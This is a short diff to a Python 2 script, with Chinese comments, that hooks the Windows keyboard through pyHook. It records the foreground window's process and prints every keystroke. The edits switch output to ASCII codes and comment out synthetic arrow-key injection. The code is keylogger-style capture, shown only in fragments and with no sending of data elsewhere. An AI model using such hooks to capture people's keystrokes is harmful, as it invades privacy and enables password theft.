@@ -12,7 +12,6 @@ kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
 
-
 #
 def get_current_process():
     # 获取最上层的窗口句柄
@@ -44,7 +43,6 @@ def get_current_process():
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
 
-
 # 定义击键监听事件函数
 def KeyStroke(event):
     global current_window
@@ -58,9 +56,17 @@ def KeyStroke(event):
         # 检测击键是否常规按键（非组合键等）
     if event.Ascii > 32 and event.Ascii < 127:
         # print chr(event.Ascii),
-        print chr(event.Ascii)
+        print event.Ascii
         if event.Ascii == 97:
-            win32api.keybd_event(37,0,0,0)
+            # win32api.keybd_event(37, 0, 0, 0)
+            pass
+        if event.Ascii == 115:
+            # win32api.keybd_event(37, 0, 0, 0)
+            pass
+        '''
+        q 113 w 119 e 101 r 114 t 116 y 121
+        a 97 s 115 d 100 f 102 g 103 h 104
+        '''
     else:
         print event.Key
     # else:
@@ -74,7 +80,6 @@ def KeyStroke(event):
     #         print "[%s]" % event.Key,
     #         # 循环监听下一个击键事件
     return True
-
 
 # 创建并注册hook管理器
 kl = pyHook.HookManager()
